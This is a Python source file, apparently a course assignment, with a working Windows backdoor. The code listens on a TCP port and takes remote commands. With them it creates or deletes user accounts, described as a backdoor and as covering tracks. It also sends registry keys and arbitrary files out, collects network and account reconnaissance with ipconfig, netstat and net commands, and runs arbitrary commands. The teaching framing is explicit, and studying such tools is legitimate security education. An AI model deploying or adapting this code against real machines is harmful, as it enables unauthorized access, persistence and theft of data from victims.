'''
This project is something of a nod to the other course I taught. You'll
be writing a python script to gather information from a host machine and
send it to a target server. We'll be using a bit of the code from our
previous project, which I included in this file already.

HINT: We're gonna use the crap out of the subprocess module in this

Your functions are as follows:
    create_user 
        given a name, create a user
        # great way to create admin access for yourself. A backdoor.
    
    delete_user
        get rid of a user, cover your tracks, or just to upset the owner
    
    download_registry_key
        given a root and a key path, send the value to the client
    
    download_file
        given a specific file name (we're not going to do a full drive 
        search, since you already wrote that code in another project),
        download it to the client
    
    gather_information
        - using Ipconfig and Netstat, learn what addresses this machine 
          owns, and what connections it has active
        - using the Net suite, gather the various pieces of intel 
          covered in previous courses, specifically:
			Accounts (Password and account policy data)
			File (Indicates shared files or folders which are in use)
			localgroup(list of groups on a machine)
			session(Display information about sessions on a machine)
			share (lists all shares from the machine)
			user (lists users)
			view (list known computers in the domain)

	
        
    execute_command
        execute an arbitrary command and send the results back to the 
        client
        # handy feature to have in a script like this. Basically you can execute and do things you didn't plan for ahead of time.


Basically, this is what you can do after you hack and gain access into a client's computer.
'''
import subprocess, socket, time, struct
from _winreg import *

error_log = open("err.log","w");


def recv_data(sock):
    data_len, = struct.unpack("!I",sock.recv(4))
    return sock.recv(data_len)
    
def send_data(sock,data):
    data_len = len(data)
    sock.send(struct.pack("!I",data_len))
    sock.send(data)
    return

def create_user(name,pwd):
    # net help user (type that in cmd) is the way to go to add users in Windows
    # net user /add username password
    # subprocess runs cmd commands
    commandList = ["net",
                   "user",
                   "/add",
                   name,
                   pwd];
    subprocess.Popen(commandList,0,None,None,None,error_log);
    return;

def delete_user(name):
    #net user /del name
    commandList = ["net",
                   "user",
                   "/del",
                   name];

    subprocess.Popen(commandList,0,None,None,None,error_log);

    return;

def download_registry_key(root, path, sock):
    # You know about the registry right? Good. It stores all the important information about the current machine.
    # In gathering information, it is the sort of thing we want.
    # We are going to use the _winreg library.
    # This uses the CreateKey(key,sub_key) and QueryInfoKey(key) methods in the _winreg library.
    root_dict = {"HKEY_CLASSES_ROOT" : HKEY_CLASSES_ROOT,
                 "HKEY_CURRENT_USER" : HKEY_CURRENT_USER,
                 "HKEY_LOCAL_MACHINE" : HKEY_LOCAL_MACHINE,
                 "HKEY_USERS" : HKEY_USERS,
                 "HKEY_CURRENT_CONFIG" : HKEY_CURRENT_CONFIG,
                 };
    
    root = root_dict[root];
    
    keyHandle = CreateKey(root,path);
    numSubKeys , numValues , lastModified = QueryInfoKey(keyHandle);

    send_data(sock, "SUBKEYS: %d\nVALUES: %d\n" % (numSubKeys,numValues) );

    
    send_data(sock, "+++++++++++++SUBKEYS+++++++++++++++");
    # To enumerate Keys, we are going to use the EnumKey(key, index) method.
    for i in range(numSubKeys):
        send_data(sock, EnumKey(keyHandle,i));

    send_data(sock, "+++++++++++++VALUES+++++++++++++++");
    # To enumerate Values, we are going to use the EnumValue(key, index) method.
    for i in range(numValues):
        vName,vData,dType = EnumValue(keyHandle,i);
        send_data(sock, "%s : %d" %(vName,vData));

    send_data(sock,"DATA_COMPLETE"); # Tells the client that we have finished sending data over. Less errors that way.
    
    return

def download_file(file_name,sock):
    f = open(file_name,"r");
    send_data(sock, f.read());
    return
        
def gather_information(log_name,sock):
    commandList = [ ["ipconfig","/all"],
                    ["netstat"],
                    ["net","accounts"],
                    ["net","file"],
                    ["net","localgroup"],
                    ["net","session"],
                    ["net","share"],
                    ["net","user"],
                    ["net","view"]
        ];
    log = open(log_name,"w");
    
    for i in commandList:
        subprocess.Popen(i,0,None,None,log,log);

    log.close();
    print "LOG CREATED.";

    download_file(log_name,sock); # We don't use send_data because send_data is more for sending strings and commands, not whole files.
    
    
    return
    
def execute_command(cmd,log_file):
    # Executes an arbitrary command. It's going to run whatever you throw at it.
    # Really useful, huh?
    f = open(log_file,"w");
    try:
        subprocess.Popen(cmd,0,None,None,f,f);
    except WindowsError:
        
        subprocess.Popen(cmd+".com",0,None,None,f,f); #WorkAround
    f.close();
    return
    
def get_data(sock, str_to_send):
    # Helper tool: Hi I want this file.
    send_data(sock,str_to_send);
    return recv_data(sock);

def main():
    #f = open("log.txt","w");
    #print create_user(raw_input("Name: "),raw_input("Password: "),f);
    
    #f= open("log.txt","w");
    #print delete_user(raw_input("Name: "),f);
    
    #download_registry_key(HKEY_CURRENT_USER, "Console",0);

    #gather_information("infolog.txt",0);

    #execute_command("tree","treelog.txt");

    ''' Sending all these information over a network. '''
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
    sock.bind(('',44343));
    sock.listen(1);
    print "Waiting for connection...";
    
    conn , info = sock.accept();
    
    print "Connection Established.";
    
    command_list = ["CU" , "DU" , "DRK", "DF" , "GI" , "EC" ];
    
    sentinel = True;
    while(sentinel == True):
        cmd = get_data(conn,"COMMAND: ");
        if (cmd == "CU"):
            create_user(get_data(conn,"Name: "),get_data(conn, "Password: "));
        elif(cmd == "DU"):
            delete_user(get_data(conn,"Name: "));
        elif(cmd == "DRK"):
            download_registry_key(get_data(conn, "Root: "), get_data(conn,"Path: "),conn);
        elif(cmd == "DF"):
            download_file(get_data(conn,"Filename: "),conn);
        elif(cmd == "GI"):
            gather_information(get_data(conn,"Log name: "),conn);
        elif(cmd == "EC"):
            execute_command(get_data(conn,"Command: "),get_data(conn,"Log name: "));
        
    return
    
main()
    
